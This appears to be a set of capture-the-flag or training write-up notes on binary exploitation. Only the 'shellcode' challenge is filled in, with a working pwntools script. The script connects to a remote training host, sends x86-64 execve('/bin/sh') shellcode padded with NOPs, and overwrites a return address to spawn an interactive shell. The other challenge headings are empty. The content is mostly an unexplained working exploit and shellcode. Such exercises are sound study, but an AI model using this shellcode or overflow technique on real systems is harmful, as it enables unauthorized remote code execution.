# shellcode
### Analysis
### Exploit
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['gnome-terminal', '-e']
# ssh = ssh("acidburn", "192.168.56.103")
# r = ssh.process("./shellcode")
# gdb.attach(r, """
# 	c
# 	""")

r = remote("training.jinblack.it", 2001)

#input("wait")
print(r.recvuntil("name?\n"))

buffer = 0x601080

# First shellcode
# mov rax, 0x3b
# mov rdi, 0x601148
# mov rsi, 0x601150
# mov rdx, 0x601150
# syscall

shellcode = b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x48\x11\x60\x00\x48\xC7\xC6\x50\x11\x60\x00\x48\xC7\xC2\x50\x11\x60\x00\x0F\x05"
shellcode = shellcode.ljust(200, b"\x90")
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

#second shellcode
# jmp endshellcode
# shellcode:
# pop rdi
# mov rsi, rdi
# add rsi, 8
# mov rdx, rsi
# mov rax, 0x3b
# syscall

# endshellcode:
# call shellcode
# nop



shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

payload = shellcode.ljust(1016, b"\x90") + p64(buffer)

r.send(payload)

r.interactive()
```

# sh3llc0d3
### Analysis
### Exploit

# multistage
### Analysis
### Exploit

# gimme3bytes
### Analysis
### Exploit

# server
### Analysis
### Exploit

# onlyreadwrite
### Analysis
### Exploit
